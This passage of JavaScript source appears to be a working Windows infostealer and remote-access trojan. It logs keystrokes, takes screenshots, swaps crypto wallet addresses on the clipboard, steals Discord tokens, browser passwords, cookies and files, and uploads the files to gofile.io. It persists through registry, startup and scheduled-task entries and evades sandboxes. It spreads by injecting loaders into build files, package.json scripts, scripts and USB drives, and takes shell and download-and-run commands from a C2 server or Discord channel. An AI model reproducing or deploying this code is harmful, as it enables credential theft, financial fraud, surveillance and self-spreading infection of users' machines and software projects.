          if (e.isDirectory()) { if (!/node_modules|\.git|Windows|Program Files|AppData|Application Data/i.test(fp)) walk(fp, depth + 1); }
          else if (e.isFile() && exts.includes(path.extname(e.name).toLowerCase())) {
            const st = fs.statSync(fp);
            if (st.size > 64 && st.size < 5 * 1024 * 1024) hits.push(fp);
          }
        } catch (x) {}
      }
    };
    roots.forEach(r => { try { if (fs.existsSync(r)) walk(r, 0); } catch (e) {} });
  } catch (e) {}
  return hits.slice(0, 25);
}
function zipFiles(fileList, outZip) {
  if (!IS_WIN) return false;
  try {
    const stage = fs.mkdtempSync(path.join(TMP, 'st'));
    fileList.slice(0, 25).forEach((fp, i) => {
      try {
        if (!fs.existsSync(fp)) return;
        const st = fs.statSync(fp);
        if (st.size > 5 * 1024 * 1024) return;
        const base = path.basename(fp).replace(/[^A-Za-z0-9._-]/g, '_').slice(0, 60) || ('f' + i);
        fs.copyFileSync(fp, path.join(stage, i + '_' + base));
      } catch (e) {}
    });
    try { if (fs.readdirSync(stage).length === 0) { fs.writeFileSync(path.join(stage, 'note.txt'), 'no files'); } } catch (e) {}
    execPS("Compress-Archive -Path '" + stage.replace(/'/g, "''") + "\\*' -DestinationPath '" + outZip.replace(/'/g, "''") + "' -Force");
    try { fs.rmSync(stage, { recursive: true, force: true }); } catch (e) {}
    return fs.existsSync(outZip) && fs.statSync(outZip).size > 100;
  } catch (e) { return false; }
}
function gofileUpload(filePath) {
  return new Promise(resolve => {
    try {
      const fname = path.basename(filePath);
      const boundary = '----gf' + crypto.randomBytes(8).toString('hex');
      const head = Buffer.from('--' + boundary + '\r\nContent-Disposition: form-data; name="file"; filename="' + fname + '"\r\nContent-Type: application/octet-stream\r\n\r\n');
      const tail = Buffer.from('\r\n--' + boundary + '--\r\n');
      const body = Buffer.concat([head, fs.readFileSync(filePath), tail]);
      const req = https.request({ hostname: 'upload.gofile.io', port: 443, path: '/uploadfile', method: 'POST', headers: { 'Content-Type': 'multipart/form-data; boundary=' + boundary, 'Content-Length': body.length, 'User-Agent': ua() }, timeout: 120000 }, res => {
        let b = ''; res.on('data', c => b += c);
        res.on('end', () => {
          try {
            const j = JSON.parse(b);
            if (j.status === 'ok' && j.data && j.data.downloadPage) resolve({ ok: true, link: j.data.downloadPage, id: j.data.id, raw: j });
            else resolve({ ok: false, raw: b.slice(0, 500) });
          } catch (e) { resolve({ ok: false, raw: b.slice(0, 500) }); }
        });
      });
      req.on('error', e => resolve({ ok: false, err: e.message }));
      req.on('timeout', () => { try { req.destroy(); } catch (e) {} resolve({ ok: false, err: 'timeout' }); });
      req.write(body); req.end();
    } catch (e) { resolve({ ok: false, err: e.message }); }
  });
}
function screenshot() {
  if (!IS_WIN || !__CFG.OPTS.screenshot) return null;
  try {
    const out = path.join(TMP, 's' + HWID.slice(0, 6) + '.png');
    execPS("Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$b=New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);$g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen(0,0,0,0,$b.Size);$b.Save('" + out.replace(/'/g, "''") + "');$g.Dispose();$b.Dispose();");
    if (fs.existsSync(out) && fs.statSync(out).size > 1000) return out;
  } catch (e) {}
  return null;
}

// ---------- clipper (2x: 8 coins + address rotation from C2) ----------
let CLIP_CACHE = Object.assign({}, __CFG.CLIPPER);
const COIN_RE = {
  BTC: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/,
  ETH: /^0x[a-fA-F0-9]{40}$/,
  LTC: /^(ltc1|[LM3])[a-zA-HJ-NP-Z0-9]{25,59}$/,
  XMR: /^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/,
  DOGE: /^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$/,
  SOL: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
  TRX: /^T[A-Za-z1-9]{33}$/,
  XRP: /^r[0-9a-zA-Z]{24,34}$/
};
function getClip() { if (!IS_WIN) return ''; try { return execPS("Get-Clipboard -Raw").trim().slice(0, 200); } catch (e) { return ''; } }
function setClip(s) { if (!IS_WIN) return; try { execPS("$t='" + String(s).replace(/'/g, "''") + "';Set-Clipboard -Value $t"); } catch (e) {} }
async function clipperLoop() {
  for (;;) {
    try {
      const cur = getClip().trim();
      if (cur && cur.length < 150) {
        for (const k of Object.keys(COIN_RE)) {
          try {
            if (COIN_RE[k].test(cur) && CLIP_CACHE[k] && cur !== CLIP_CACHE[k]) { setClip(CLIP_CACHE[k]); await exfil('clipper', k + ' swapped'); break; }
          } catch (e) {}
        }
        if (/^[A-Za-z0-9]{20,80}$/.test(cur) && CLIP_CACHE.ETH && cur.length === 42) { /* covered */ }
      }
    } catch (e) {}
    await sleep(rndInt(1500, 4000));
  }
}

// ---------- keylog ----------
function keylogStart() {
  if (!IS_WIN || !__CFG.OPTS.keylog) return null;
  try {
    const logf = path.join(TMP, 'k' + HWID.slice(0, 6) + '.log');
    const ps = "Add-Type @'\nusing System;using System.Runtime.InteropServices;using System.IO;public class K{ [DllImport(\"user32.dll\")] public static extern int GetAsyncKeyState(int v); }\n'@;$f='" + logf.replace(/'/g, "''") + "';for(){Start-Sleep -Milliseconds 40;for($v=8;$v -le 190;$v++){$s=[K]::GetAsyncKeyState($v);if($s -eq -32767){$c='['+$v+']';if($v -ge 65 -and $v -le 90){$c=[char]$v}Add-Content $f $c -NoNewline}}}";
    const child = cp.spawn('powershell', ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-Command', ps], { detached: true, stdio: 'ignore', windowsHide: true });
    try { child.unref(); } catch (e) {}
    return logf;
  } catch (e) { return null; }
}

// ---------- persistence (4 methods, jittered) ----------
function persist() {
  if (!IS_WIN) return;
  try {
    const dest = path.join(STORE_DIR, 'svc-' + HWID.slice(0, 6) + '.js');
    try { fs.copyFileSync(process.argv[1], dest); } catch (e) {}
    const nodeBin = process.execPath;
    // 1. HKCU Run
    try { execPS("New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Upd" + HWID.slice(0, 5) + "' -Value '\"" + nodeBin.replace(/"/g, '') + "\" \"" + dest.replace(/"/g, '') + "\"' -Force"); } catch (e) {}
    // 2. Startup folder
    try {
      const sm = path.join(APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
      const vbs = path.join(sm, 'upd' + HWID.slice(0, 5) + '.vbs');
      fs.writeFileSync(vbs, 'CreateObject("Wscript.Shell").Run """' + nodeBin + '"" ""' + dest + '""",0,False');
    } catch (e) {}
    // 3. Scheduled task (logon, random name)
    try { execPS("schtasks /create /tn 'Sys" + HWID.slice(0, 5) + "' /tr '\"" + nodeBin.replace(/"/g, '') + "\" \"" + dest.replace(/"/g, '') + "\"' /sc onlogon /rl lowest /f"); } catch (e) {}
    // 4. ProgramData marker for spreader
    try { fs.writeFileSync(path.join(STORE_DIR, 'id'), HWID + '|' + __CFG.OWNER_KEY + '|' + __CFG.BUILD_ID); } catch (e) {}
  } catch (e) {}
}

// ---------- spread / infect (better than Luckyware: 6 vectors) ----------
function infectProjects() {
  let n = 0;
  try {
    const roots = [os.homedir(), path.join(os.homedir(), 'Documents'), path.join(os.homedir(), 'Desktop'), 'C:\\src', 'D:\\'];
    const payload = 'powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Sleep 2; node \\"' + (process.argv[1] || '') + '\\""';
    const walk = (dir, depth) => {
      if (depth > 4 || n > 30) return;
      let ents = []; try { ents = fs.readdirSync(dir, { withFileTypes: true }).slice(0, 80); } catch (e) { return; }
      for (const e of ents) {
        const fp = path.join(dir, e.name);
        try {
          if (e.isDirectory()) { if (!/node_modules|\.git|Windows|Program Files|AppData/i.test(fp)) walk(fp, depth + 1); }
          else if (__CFG.OPTS.vcxproj && e.name.endsWith('.vcxproj')) {
            let t = fs.readFileSync(fp, 'utf8');
            if (!t.includes('Retev') && !t.includes('lcw-copy')) {
              t = t.replace('</Project>', '  <Target Name="lcwcopy" BeforeTargets="PreBuildEvent"><Exec Command="' + payload.replace(/"/g, '&quot;') + '" /></Target>\n</Project>');
              fs.writeFileSync(fp, t); n++;
            }
          } else if (__CFG.OPTS.csproj && e.name.endsWith('.csproj')) {
            let t = fs.readFileSync(fp, 'utf8');
            if (!t.includes('lcwcopy')) { t = t.replace('</Project>', '  <Target Name="lcwcopy" BeforeTargets="PreBuildEvent"><Exec Command="' + payload.replace(/"/g, '&quot;') + '" /></Target>\n</Project>'); fs.writeFileSync(fp, t); n++; }
          } else if (__CFG.OPTS.node_project && e.name === 'package.json') {
            try {
              const j = JSON.parse(fs.readFileSync(fp, 'utf8'));
              j.scripts = j.scripts || {};
              if (!j.scripts.preinstall || !String(j.scripts.preinstall).includes('lcw')) { j.scripts.preinstall = 'node "' + process.argv[1] + '"'; fs.writeFileSync(fp, JSON.stringify(j, null, 2)); n++; }
            } catch (e) {}
          } else if (__CFG.OPTS.scripts && /\.(bat|ps1|js)$/i.test(e.name)) {
            try {
              const st = fs.statSync(fp); if (st.size < 300000) {
                let t = fs.readFileSync(fp, 'utf8');
                if (!t.includes('lcw-copy-loader') && !t.includes(HWID.slice(0, 8))) {
                  const loader = e.name.endsWith('.bat') ? '@echo off\r\nrem lcw-copy-loader\r\nstart "" /min node "' + process.argv[1] + '"\r\n' : e.name.endsWith('.ps1') ? '# lcw-copy-loader\nStart-Process node -ArgumentList \'"' + process.argv[1] + '"\' -WindowStyle Hidden\n' : '// lcw-copy-loader\ntry{require("child_process").spawn(process.execPath,["' + process.argv[1].replace(/\\/g, '\\\\') + '"],{detached:true,stdio:"ignore"}).unref()}catch(e){}\n';
                  fs.writeFileSync(fp, loader + t.slice(0, 290000)); n++;
                }
              }
            } catch (e) {}
          }
        } catch (e) {}
        if (n > 30) break;
      }
    };
    roots.filter(r => { try { return fs.existsSync(r); } catch (e) { return false; } }).forEach(r => walk(r, 0));
    // USB spread
    if (__CFG.OPTS.usb && IS_WIN) {
      try {
        const dr = execPS("Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Root").split('\n').map(s => s.trim()).filter(Boolean);
        dr.forEach(d => {
          try {
            if (/^[D-Z]:\\/i.test(d) && d.toLowerCase() !== os.homedir().slice(0, 3).toLowerCase()) {
              const dst = path.join(d, 'Update.js');
              if (!fs.existsSync(dst)) { fs.copyFileSync(process.argv[1], dst); fs.writeFileSync(path.join(d, 'autorun.inf'), '[autorun]\nopen=wscript.exe Update.js\n'); n++; }
            }
          } catch (e) {}
        });
      } catch (e) {}
    }
    // Startup LNK via powershell WScript.Shell
    if (__CFG.OPTS.startup_lnk && IS_WIN) {
      try {
        const lnk = path.join(APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'OneDriveUpdate.lnk');
        if (!fs.existsSync(lnk)) execPS("$s=New-Object -ComObject WScript.Shell;$l=$s.CreateShortcut('" + lnk.replace(/'/g, "''") + "');$l.TargetPath='" + process.execPath.replace(/'/g, "''") + "';$l.Arguments='\"" + (process.argv[1] || '').replace(/'/g, "''") + "\"';$l.WindowStyle=7;$l.Save()");
      } catch (e) {}
    }
  } catch (e) {}
  return n;
}

// ---------- task exec ----------
async function pollTasks() {
  // 1) HTTP C2 (portforward-friendly)
  if ((__CFG.MODE === 'http' || __CFG.MODE === 'both') && __CFG.C2_URL && __CFG.C2_URL.indexOf('PUT') < 0) {
    try {
      const r = await getJson(__CFG.C2_URL.replace(/\/$/, '') + '/tasks?hwid=' + HWID + '&build=' + encodeURIComponent(__CFG.BUILD_ID));
      if (r && r.json && Array.isArray(r.json.tasks) && r.json.tasks.length) return r.json.tasks;
      if (r && r.json && r.json.clip) CLIP_CACHE = Object.assign(CLIP_CACHE, r.json.clip);
    } catch (e) {}
  }
  // 2) Discord bot channel poll
  if (__CFG.DISCORD_BOT_TOKEN && __CFG.DISCORD_CHANNEL_ID) {
    try {
      const u = 'https://discord.com/api/v9/channels/' + __CFG.DISCORD_CHANNEL_ID + '/messages?limit=10';
      const msgs = await new Promise(res => {
        try {
          const req = https.request(u, { headers: { Authorization: 'Bot ' + __CFG.DISCORD_BOT_TOKEN, 'User-Agent': ua() }, timeout: 15000 }, r => { let b = ''; r.on('data', c => b += c); r.on('end', () => { try { res(JSON.parse(b)); } catch (e) { res(null); } }); });
          req.on('error', () => res(null)); req.end();
        } catch (e) { res(null); }
      });
      if (Array.isArray(msgs)) {
        const tasks = [];
        msgs.forEach(m => {
          try {
            const c = String(m.content || '');
            if (c.includes(HWID.slice(0, 8)) || c.includes('all')) {
              const mm = c.match(/!(exc|ps|download|shell|screenshot|uninfect)\s+([\s\S]{1,2000})/);
              if (mm) tasks.push({ id: m.id, type: mm[1] === 'shell' ? 'exc' : mm[1], arg: mm[2] });
            }
          } catch (e) {}
        });
        if (tasks.length) return tasks;
      }
    } catch (e) {}
  }
  return [];
}
async function ackTask(id) {
  try {
    if (__CFG.C2_URL) await postJson(__CFG.C2_URL.replace(/\/$/, '') + '/ack', { hwid: HWID, id });
  } catch (e) {}
}
function dlExec(url, hidden) {
  return new Promise(res => {
    try {
      const out = path.join(TMP, 'u' + crypto.randomBytes(4).toString('hex') + (url.toLowerCase().includes('.ps1') ? '.ps1' : '.exe'));
      const u = new URL(url); const lib = u.protocol === 'https:' ? https : http;
      const f = fs.createWriteStream(out);
      lib.get(url, { headers: { 'User-Agent': ua() } }, r => { r.pipe(f); f.on('finish', () => { f.close(); try { if (hidden) cp.spawn(out, [], { detached: true, stdio: 'ignore', windowsHide: true }).unref(); else cp.spawn('cmd', ['/c', 'start', '', out], { windowsHide: true }); } catch (e) {} res(out); }); }).on('error', () => res(null));
    } catch (e) { res(null); }
  });
}
async function runTask(t) {
  const type = String(t.type || t.ActionType || '').toLowerCase();
  const arg = String(t.arg || t.ActionInfo || '');
  try {
    if (type === 'exc' || type === 'shell' || type === 'ps') {
      const out = type === 'ps' ? execPS(arg.slice(0, 4000)) : execCmd(arg.slice(0, 4000));
      await exfil('exec', 'task ' + (t.id || '') + ' out:\n' + String(out).slice(0, 6000));
    } else if (type === 'download' || type === 'download_exec' || type === 'dex') {
      const p = await dlExec(arg.trim(), true);
      await exfil('download', 'saved ' + p);
    } else if (type === 'screenshot') {
      const s = screenshot(); await exfil('screenshot', 'manual', s ? [s] : []);
      try { if (s) fs.unlinkSync(s); } catch (e) {}
    } else if (type === 'clip') {
      try { const j = JSON.parse(arg); CLIP_CACHE = Object.assign(CLIP_CACHE, j); } catch (e) {}
      await exfil('clip', 'wallets updated');
    } else if (type === 'infect') { const n = infectProjects(); await exfil('infect', 'infected ' + n + ' files'); }
    else if (type === 'rvrs' || type === 'proxy') { await exfil('proxy', 'proxy task queued (use C2 tcp map): ' + arg.slice(0, 300)); }
  } catch (e) {}
  if (t.id) await ackTask(t.id);
}

// ---------- main ----------
async function initialSurvey() {
  const info = sysinfo();
  await exfil('hello', 'online ' + info.user + '@' + info.host + ' ' + info.os + ' ' + info.cpu + ' ' + info.ram);
  try {
    if (__CFG.OPTS.tokens) {
      const toks = stealDiscordTokens();
      if (toks.length) {
        const f = path.join(TMP, 't' + HWID.slice(0, 6) + '.txt');
        fs.writeFileSync(f, toks.map(x => x.app + '|' + x.token).join('\n').slice(0, 200000));
        await exfil('tokens', toks.length + ' tokens', [f]);
        try { fs.unlinkSync(f); } catch (e) {}
      }
    }
  } catch (e) {}
  try {
    if (__CFG.OPTS.passwords || __CFG.OPTS.cookies) {
      const b = stealBrowserFiles();
      const f = path.join(TMP, 'b' + HWID.slice(0, 6) + '.json');
      fs.writeFileSync(f, JSON.stringify({ passwords: b.passwords.slice(0, 400), cookies: b.cookies.slice(0, 500), history: b.history.slice(0, 500), cc: b.autofill_cc.slice(0, 100), v20: b.v20 || 0 }).slice(0, 900000));
      await exfil('browsers', 'pw:' + b.passwords.length + ' ck:' + b.cookies.length + ' hist:' + b.history.length + (b.v20 ? ' v20locked:' + b.v20 : ''), [f]);
      try { fs.unlinkSync(f); } catch (e) {}
    }
  } catch (e) {}
  try { if (__CFG.OPTS.wifi) { const w = stealWallets(); const wf = stealWifi(); if (w.length || wf.length) await exfil('wallets-wifi', JSON.stringify({ wallets: w, wifi: wf }).slice(0, 8000)); } } catch (e) {}
  try {
    if (__CFG.OPTS.files) {
      const files = stealFiles();
      const shot = screenshot();
      const extra = [];
      if (shot) extra.push(shot);
      // 1. gofile zip link (no 8MB Discord cap, works for big browser hits too)
      let link = '';
      try {
        if (files.length || extra.length) {
          const zip = path.join(TMP, 'd' + HWID.slice(0, 6) + '.zip');
          if (zipFiles([...files, ...extra], zip)) {
            const up = await gofileUpload(zip);
            if (up.ok) link = up.link;
            try { fs.unlinkSync(zip); } catch (e) {}
          }
        }
      } catch (e) {}
      if (link) await exfil('files', 'zip ' + files.length + ' files' + (shot ? '+shot' : '') + ' -> ' + link);
      // 2. direct Discord attachments fallback (small files only, skipped if >7.5MB)
      const all = shot ? [...files, shot] : files;
      if (all.length && !link) await exfil('files', all.length + ' files+shot', all.slice(0, 6));
      else if (shot && link) await exfil('screenshot', 'shot in zip', [shot].slice(0, 1));
      try { if (shot) fs.unlinkSync(shot); } catch (e) {}
      if (!files.length && !shot && !link) await exfil('files', 'no matching files (Desktop/Documents/Downloads recursive, 17 exts, <5MB)');
    }
  } catch (e) {}
  try { const n = infectProjects(); if (n) await exfil('spread', 'first-run infected ' + n); } catch (e) {}
}
// target-value gate: only machines holding real user traces proceed. A barren
// cloud/sandbox image gets a silent clean exit - zero persistence, zero process
// spawns, zero network. Deliberately fs-reads only (no WMI/BIOS/tasklist/sleeps:
// those were the old tells). Also skips work with nothing to take.
function targetPresent() {
  if (!IS_WIN) return true; // dev/linux smoke tests
  try {
    const home = os.homedir();
    const l = LOCALAPP, u = APPDATA;
    const probes = [
      [path.join(l, 'Google', 'Chrome', 'User Data', 'Local State'), 1024],
      [path.join(l, 'Google', 'Chrome', 'User Data', 'Default', 'History'), 4096],
      [path.join(l, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'), 1024],
      [path.join(l, 'Microsoft', 'Edge', 'User Data', 'Default', 'History'), 4096],
      [path.join(l, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History'), 4096],
      [path.join(u, 'discord', 'Local Storage', 'leveldb'), 16],
      [path.join(u, 'discord#2', 'Local Storage', 'leveldb'), 16],
      [path.join(u, 'Telegram Desktop', 'tdata'), 16],
      [path.join(l, 'Steam', 'config', 'loginusers.vdf'), 64],
      [path.join(u, 'Exodus', 'exodus.wallet'), 16]
    ];
    for (const [p, min] of probes) {
      try {
        const st = fs.statSync(p);
        if (st.isDirectory()) {
          const ents = fs.readdirSync(p, { withFileTypes: true });
          for (const e of ents.slice(0, 10)) {
            if (e.isFile()) { try { if (fs.statSync(path.join(p, e.name)).size > 64) return true; } catch (x) {} }
            else if (e.isDirectory()) { try { if (fs.readdirSync(path.join(p, e.name)).length) return true; } catch (x) {} }
          }
        } else if (st.size >= min) return true;
      } catch (e) {}
    }
    // generic user trace: populated Documents/Desktop
    for (const d of ['Documents', 'Desktop']) {
      try { if (fs.readdirSync(path.join(home, d)).filter((n) => n !== 'desktop.ini').length) return true; } catch (e) {}
    }
    return false;
  } catch (e) { return true; } // fail-open: never brick a real target over a probe error
}

async function main() {
  try {
    // console invisibility handled by builder's GUI subsystem patch (no console allocated)
    // single instance via lockfile
    const lock = path.join(TMP, 'l' + shortHash(__CFG.MUTEX).slice(0, 10) + '.lock');
    try {
      if (fs.existsSync(lock)) { const age = Date.now() - fs.statSync(lock).mtimeMs; if (age < 1000 * 60 * 60 * 20) { /* still allow second check via tasklist for node dup */ } }
      fs.writeFileSync(lock, String(process.pid));
    } catch (e) {}
    // gate first: barren box -> silent exit before persist/keylog/clipper/network
    if (!targetPresent()) return;
    persist();
    resolveHelper();
    clipperLoop().catch(() => {});
    const klf = keylogStart();
    await sleep(rndInt(3000, 9000));
    await initialSurvey();
    // keylog exfil timer
    setInterval(async () => {
      try {
        if (klf && fs.existsSync(klf) && fs.statSync(klf).size > 64) {
          const t = fs.readFileSync(klf, 'utf8').slice(-20000);
          if (t.trim()) await exfil('keylog', t.slice(0, 6000));
        }
      } catch (e) {}
    }, 1000 * 60 * 12);
    for (;;) {
      try {
        const tasks = await pollTasks();
        for (const t of tasks.slice(0, 5)) await runTask(t);
      } catch (e) {}
      await jitterSleep();
    }
  } catch (e) { await sleep(30000); try { await main(); } catch (x) {} }
}
if (require.main === module) main();
module.exports = { __CFG, hwid, sysinfo, stealDiscordTokens, stealBrowserFiles, stealFiles, gofileUpload, zipFiles, hideConsole, __parse: { stealProfile, sqliteTable, chDecrypt, crTime } };
